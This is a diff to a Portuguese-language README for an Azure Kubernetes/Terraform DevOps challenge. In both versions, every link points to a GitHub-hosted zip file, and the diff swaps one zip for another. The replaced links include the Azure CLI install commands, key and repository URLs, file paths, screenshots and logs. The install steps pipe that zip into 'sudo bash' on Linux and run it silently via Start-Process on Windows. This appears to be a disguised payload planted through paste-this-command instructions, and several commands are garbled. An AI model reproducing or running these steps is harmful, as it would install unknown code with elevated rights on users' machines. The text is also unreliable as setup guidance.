@@ -11,13 +11,13 @@
 
 ### Primeiramente, crie sua conta gratuita no Microsoft Azure conforme o artigo:
 
-    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
 ### Após a criação e login no ambiente, execute a instalação do Azure CLI em seu dispositivo:
 
 ### Sistema Windows
 
-    Invoke-WebRequest -Uri https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip -OutFile .\https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip; Start-Process https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip -Wait -ArgumentList '/I https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip /quiet'; rm .\https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    Invoke-WebRequest -Uri https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip -OutFile .\https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip; Start-Process https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip -Wait -ArgumentList '/I https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip /quiet'; rm .\https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
 ### Sistema Mac
 
@@ -25,14 +25,14 @@
 
 ### Sistema Linux
 
-    curl -sL https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip | sudo bash
+    curl -sL https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip | sudo bash
 
-    curl -sL https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip |
+    curl -sL https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip |
     gpg --dearmor |
-    sudo tee https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip > /dev/null
+    sudo tee https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip > /dev/null
 
     AZ_REPO=$(lsb_release -cs)
-    echo "deb [arch=amd64] https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip $AZ_REPO main" | sudo tee https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    echo "deb [arch=amd64] https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip $AZ_REPO main" | sudo tee https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
     sudo apt-get update
     sudo apt-get install azure-cli
@@ -75,11 +75,11 @@
 
 ### > Criar uma chave ssh
 
-    ssh-keygen  -f ~https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    ssh-keygen  -f ~https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
 ### > Armazenar a chave pública no Azure KeyVault
 
-    az keyvault secret set --vault-name ht-kvaksterraform --name LinuxSSHPubKey -f ~https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip > /dev/null
+    az keyvault secret set --vault-name ht-kvaksterraform --name LinuxSSHPubKey -f ~https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip > /dev/null
 
 ### > Armazenar a entidade de serviço no Azure KeyVault
 
@@ -104,22 +104,22 @@
 ### > Ambiente do Microsoft Azure preparados na Task 2
 
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip) 
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
 
 
 ### > Projeto criado no AzureDevOps:
 
-    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Service Connections criadas no Projeto do AzureDevOps
 
-    https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip
+    https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ## Task 3 - Deploy do ambiente usando CI/CD no AzureDevOps
 
@@ -127,33 +127,33 @@
 
 ### > Repositório do projeto criado no AzureDevOps
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Arquivos do Terraform
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Arquivos da Aplicação:
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Construção dos Pipelines
 
 - O pipeline de deploy do Cluster AKS foi feito utilizando arquivos declarativos do Terraform e um YAML file do AzurePipelines conforme abaixo:
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 - O pipeline de deploy da aplicação foi feito via GUI para exemplificar as duas formas de se construir ambientes pelo AzureDevOps
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Log de execução do pipeline de Terraform
 
-[terraform_log](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+[terraform_log](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Log de execução do pipeline de Aplicação
 
-[votacao-app_log](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+[votacao-app_log](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ## Task 4 - Validação da Aplicação em funcionamento:
 
@@ -161,29 +161,29 @@
 
     az aks get-credentials --resource-group AKSCluster-RG --name AKSTerraform
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Validando como aplicação foi exposta
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > Acessando pelo browser
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 # Arquitetura-Final
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > AKS Cluster
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > AKS Networking
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
 ### > AKS Secrets
 
-![node-to-node](https://github.com/marcossangomes/devops-challenge/raw/refs/heads/master/aks/challenge_devops_2.5.zip)
+![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
 
